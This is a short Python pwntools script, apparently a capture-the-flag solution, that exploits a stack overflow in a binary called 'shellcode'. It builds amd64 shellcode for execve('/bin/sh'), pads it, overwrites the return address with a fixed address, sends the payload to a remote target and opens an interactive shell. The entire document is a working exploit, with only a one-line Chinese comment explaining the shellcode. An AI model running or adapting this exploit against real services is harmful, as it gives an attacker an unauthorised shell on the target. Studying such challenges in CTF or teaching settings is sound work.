from pwn import *
#p = process("./shellcode")
p = remote(...)
context.log_level = "debug"
context.arch = "amd64"

shellcode = asm(shellcraft.amd64.sh())
#调用 execve("/bin/sh") 的 amd64 shellcode
shellcode = shellcode.ljust(256,b'A')

payload = shellcode + b'A'*8 + p64(0x00000000004040A0)

p.send(payload)
p.interactive()
